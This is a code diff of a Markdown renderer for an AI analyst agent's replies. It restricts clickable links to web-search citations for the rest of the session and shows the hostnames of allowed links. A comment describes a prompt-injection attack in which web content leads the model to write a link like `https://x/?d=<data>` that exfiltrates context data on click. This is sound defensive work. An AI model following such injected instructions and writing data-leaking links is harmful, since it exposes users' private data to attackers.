@@ -3,8 +3,7 @@ import ReactMarkdown, { type Components } from "react-markdown"
 import remarkGfm from "remark-gfm"
 
 import { cn } from "@/lib/utils"
-import { linkAllowlist, normalizeLinkUrl } from "@/lib/ai-tools"
-import type { ToolCall } from "@/hooks/useAiTurn"
+import { citationDomain, normalizeLinkUrl, parseLinkAllowlist } from "@/lib/ai-tools"
 
 // The analyst agent answers in Markdown (bold figures, GFM tables, `code` for
 // ids / function names). Rendered here instead of shown raw.
@@ -18,13 +17,18 @@ import type { ToolCall } from "@/hooks/useAiTurn"
 //     alt text only — no <img> element, so nothing is ever fetched;
 //   * links render, but open in a new tab without referrer, and react-markdown's
 //     default urlTransform already neutralises `javascript:` URLs;
-//   * in a message that searched the web (`search_web`), only links whose URL
-//     is one of that message's citations are clickable. Web content is
-//     attacker-controllable, and an injected instruction can make the model
-//     write `[source](https://x/?d=<data from its context>)` — one click and
-//     the data is gone. Every other link is shown as text, URL included, so
-//     the reader still sees where it pointed. Messages without a web search
-//     are unaffected.
+//   * once the conversation has searched the web (`search_web`), only links
+//     whose URL is one of the session's citations so far are clickable — in
+//     that message and in every later one, compare columns included. Web
+//     content is attacker-controllable and stays in the model's context, so an
+//     injected instruction can make the model write
+//     `[source](https://x/?d=<data from its context>)` turns later — one click
+//     and the data is gone. Every other link is shown as text, URL included,
+//     so the reader still sees where it pointed; an allowed link whose text is
+//     not its URL gets the hostname next to it (the link text is model-written,
+//     the page behind a citation is not ours). Messages before the first
+//     search are unaffected. The caller computes the set
+//     (`sessionLinkAllowlists`); this component only applies it.
 function ExternalLink({ href, children }: { href?: string; children?: ReactNode }) {
   return (
     <a href={href} target="_blank" rel="noopener noreferrer nofollow" className="text-primary underline underline-offset-2">
@@ -82,14 +86,30 @@ const baseComponents: Components = {
 
 const remarkPlugins = [remarkGfm]
 
-/** A link that is not in the message's citation set: text only, URL visible. */
+/** Plain text of a link's children, when it is plain text. */
+function linkLabel(children: ReactNode): string | null {
+  if (typeof children === "string") return children
+  if (Array.isArray(children) && children.every((c) => typeof c === "string")) return children.join("")
+  return null
+}
+
+/** Links limited to the session's citation set; anything else is text only, URL visible. */
 function restrictedLinks(allowed: ReadonlySet<string>): Components {
   return {
     ...baseComponents,
     a: ({ href, children }) => {
       const normalized = normalizeLinkUrl(href)
-      if (normalized && allowed.has(normalized)) return <ExternalLink href={href}>{children}</ExternalLink>
-      const label = typeof children === "string" ? children : null
+      const label = linkLabel(children)
+      if (normalized && allowed.has(normalized)) {
+        const host = citationDomain(normalized)
+        const showsHost = label !== null && label.toLowerCase().includes(host.toLowerCase())
+        return (
+          <>
+            <ExternalLink href={href}>{children}</ExternalLink>
+            {host && !showsHost && <span className="text-muted-foreground"> ({host})</span>}
+          </>
+        )
+      }
       return (
         <span>
           {children}
@@ -102,16 +122,19 @@ function restrictedLinks(allowed: ReadonlySet<string>): Components {
 
 export const MarkdownMessage = memo(function MarkdownMessage({
   text,
-  tools,
+  allowedLinks,
 }: {
   text: string
-  /** The message's tool calls; decides which links may be clickable. */
-  tools?: readonly ToolCall[]
+  /**
+   * This message's entry from `sessionLinkAllowlists`: the only links that may
+   * be clickable. `undefined` = the conversation has not searched the web.
+   */
+  allowedLinks?: string
 }) {
   const components = useMemo(() => {
-    const allowed = linkAllowlist(tools)
+    const allowed = parseLinkAllowlist(allowedLinks)
     return allowed ? restrictedLinks(allowed) : baseComponents
-  }, [tools])
+  }, [allowedLinks])
   return (
     <div className="min-w-0 break-words text-sm leading-relaxed">
       <ReactMarkdown
